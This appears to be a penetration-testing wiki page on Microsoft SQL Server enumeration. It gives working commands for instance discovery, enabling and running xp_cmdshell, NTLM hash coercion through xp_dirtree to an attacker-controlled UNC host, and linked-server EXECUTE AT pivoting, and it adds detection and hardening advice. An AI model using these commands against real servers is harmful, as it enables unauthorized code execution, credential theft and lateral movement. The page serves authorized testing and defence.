---
title: MSSQL enumeration
slug: mssql-enum
---

> **TL;DR:** Microsoft SQL Server on 1433/tcp (plus 1434/udp browser) is rich in offensive primitives: `xp_cmdshell` for OS exec, linked-server impersonation chains, and outbound UNC paths for NTLM coercion.

## What it is
SQL Server enumeration covers identifying the instance, authenticating, and inventorying the primitives that lead to OS-level execution. The interesting attack surface is rarely SQL injection of the server itself — it is the rich procedural surface exposed to authenticated principals: `xp_cmdshell`, OLE automation procedures, CLR assemblies, `xp_dirtree`/`xp_fileexist` for outbound UNC, and the linked-server graph that lets one compromised instance pivot to others via `EXECUTE AT`.

## Preconditions / where it applies
- Reach to 1433/tcp on the target instance, or 1434/udp on the SQL Browser to discover named instances.
- A credential — SQL login, domain user (Windows auth), or an existing foothold under a service account.
- For OS exec: `sysadmin` or `db_owner` plus a chain to `EXECUTE AS`, or a linked server you can impersonate into.
- Related: [[smb-enum]], [[ntlm-relay]], [[password-spraying]].

## Technique
Discover instances on a subnet:

```bash
nmap -p1433 --script ms-sql-info,ms-sql-empty-password 10.0.0.0/24
nmap -sU -p1434 --script ms-sql-info 10.0.0.0/24    # SQL Browser
```

Authenticate and triage with impacket's `mssqlclient`:

```bash
mssqlclient.py CORP/alice:'Spring2026'@10.0.0.25 -windows-auth
SQL> SELECT @@version;
SQL> EXEC sp_linkedservers;
SQL> SELECT name, is_srvrolemember('sysadmin', name) FROM sys.server_principals;
```

If `xp_cmdshell` is disabled, enable it (sysadmin only):

```sql
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
EXEC xp_cmdshell 'whoami';
```

NTLM coercion via outbound UNC — works even without sysadmin if `xp_dirtree`/`xp_fileexist` is callable; capture with Responder/ntlmrelayx:

```sql
EXEC master..xp_dirtree '\\10.0.0.5\share\anything', 1, 1;
```

Linked-server impersonation chain — escalate by hopping where `rpcout` and `data access` are set with stored creds:

```sql
SELECT * FROM OPENQUERY("SQL02", 'SELECT SYSTEM_USER, IS_SRVROLEMEMBER(''sysadmin'')');
EXEC ('xp_cmdshell ''whoami''') AT [SQL02];
```

PowerUpSQL automates discovery, role inventory, and the linked-server graph (`Get-SQLServerLinkCrawl`).

## Detection and defence
- Audit `xp_cmdshell` calls (event class 102 / `audit_change_group`), CLR assembly loads, and `sp_addlinkedserver` changes.
- Disable `xp_cmdshell`, OLE automation, and the legacy SQL Mail; remove unused linked servers; force `rpcout` off where chained execution is not required.
- Enforce LDAP-signing-equivalent for SQL: enable Force Encryption + channel binding; disable SQL auth where Windows auth covers the use case.
- Segment SQL servers from user VLANs; egress-block outbound SMB so coerced NTLM cannot reach the attacker.

## References
- [HackTricks — pentesting MSSQL](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-mssql-microsoft-sql-server.html) — primitive cookbook.
- [PowerUpSQL](https://github.com/NetSPI/PowerUpSQL) — discovery and audit toolkit with linked-server crawler.
- [ired.team — MSSQL lateral movement](https://www.ired.team/offensive-security/lateral-movement/lateral-movement-with-mssql) — linked-server `EXECUTE AT` chains.
- [Microsoft — xp_cmdshell server config](https://learn.microsoft.com/en-us/sql/database-engine/configure-windows/xp-cmdshell-server-configuration-option) — official option reference.
